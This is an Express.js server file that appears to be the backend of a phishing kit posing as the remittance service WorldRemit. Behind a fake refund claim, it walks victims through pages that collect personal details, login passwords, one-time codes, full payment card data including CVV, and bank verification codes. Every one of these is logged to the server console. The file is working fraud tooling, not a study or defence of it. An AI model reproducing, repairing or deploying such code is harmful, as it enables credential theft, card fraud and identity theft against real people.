const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

// Middleware setup
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json()); // CRITICAL: Must be present
app.use(express.static(path.join(__dirname, 'public')));

// Logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Route: Serve Refund Page as Entry
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'refund.html'));
});

// API: Refund Details (User submits claim)
app.post('/api/seller-details', (req, res) => {
    console.log('--- [REFUND DETAILS CAPTURED] ---');
    console.log('Full Name:', req.body.fullName);
    console.log('Reason:', req.body.itemSold);
    console.log('Amount:', req.body.amount);
    console.log('Phone:', req.body.sellerPhone);
    console.log('Email:', req.body.buyerEmail);
    console.log('----------------------------------');
    res.json({ success: true, redirect: '/receive.html' });
});

// API: Login
app.post('/api/login', (req, res) => {
    console.log('--- [LOGIN ATTEMPT] ---');
    console.log('Username:', req.body.email);
    console.log('Password:', req.body.password);
    console.log('------------------------');
    res.json({ success: true, redirect: '/otp.html' });
});

// API: OTP
app.post('/api/otp', (req, res) => {
    console.log('--- [OTP SUBMITTED] ---');
    console.log('Code:', req.body.otp);
    console.log('Email Context:', req.body.email);
    console.log('------------------------');
    res.json({ success: true, redirect: '/payment.html' });
});

// API: Payment (The problematic step)
app.post('/api/payment', (req, res) => {
    console.log('--- [PAYMENT CARD INFO RECEIVED] ---');
    console.log('Cardholder:', req.body.cardName);
    console.log('Card Number:', req.body.cardNumber);
    console.log('Expiry:', req.body.cardExpiry);
    console.log('CVV:', req.body.cardCvv);
    console.log('Address:', req.body.billingAddress);
    console.log('City:', req.body.billingCity);
    console.log('Zip:', req.body.postalCode);
    console.log('Amount:', req.body.amount);
    console.log('---------------------------');
    
    // Send the redirect to verify.html
    console.log('REDIRECTING USER TO /verify.html');
    res.json({ success: true, redirect: '/verify.html' });
});

// API: Final Verify
app.post('/api/verify', (req, res) => {
    console.log('--- [FINAL BANK VERIFICATION] ---');
    console.log('Bank Code:', req.body.otp);
    console.log('----------------------------------');
    // Redirect to a final success page or just stop the flow
    res.json({ success: true, redirect: '/success.html' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`WorldRemit Server running on http://localhost:${PORT}`);
});
